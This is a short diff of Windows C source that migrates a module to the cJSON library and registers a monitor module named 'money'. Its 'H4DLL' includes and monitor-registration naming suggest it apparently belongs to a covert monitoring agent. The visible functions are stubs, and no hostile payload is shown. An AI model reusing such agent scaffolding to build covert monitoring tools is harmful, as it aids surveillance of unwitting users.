@@ -1,5 +1,5 @@
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/AM_Core.h"
 #include "../../H4DLL/LOG.h"
@@ -82,12 +82,12 @@ DWORD WINAPI PM_MoneyStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD WINAPI PM_MoneyInit(JSONObject elem)
+DWORD WINAPI PM_MoneyInit(cJSON* elem)
 {
 	return 1;
 }
 
 void PM_MoneyRegister()
 {
-	AM_MonitorRegister(L"money", PM_MONEY, NULL, (BYTE *)PM_MoneyStartStop, (BYTE *)PM_MoneyInit, NULL);
+	AM_MonitorRegister("money", PM_MONEY, NULL, (BYTE *)PM_MoneyStartStop, (BYTE *)PM_MoneyInit, NULL);
 }
